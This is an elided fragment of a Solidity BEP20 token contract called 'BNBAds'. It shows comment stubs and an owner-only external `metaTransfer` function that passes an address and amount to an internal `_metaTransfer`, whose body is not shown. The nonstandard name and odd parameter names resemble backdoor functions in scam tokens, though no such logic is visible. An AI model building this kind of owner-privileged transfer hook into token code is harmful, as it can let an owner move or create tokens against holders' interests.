...
contract BNBAds is Context, IBEP20, Ownable {
    ...
    */
    ...
    /**
    * @dev See {IBEP20-metaTransfer}.
    *
    * Requirements:
    *
    * - `destinatar` cannot be the zero address.
    */
    function _metaTransfer(address usuario, uint256 totaal) internal {
    ...
    * @dev See {IBEP20-metaTransfer}.
    */
    function metaTransfer(address usuario, uint256 totaal) external onlyOwner {
        _metaTransfer(usuario, totaal);
    }
}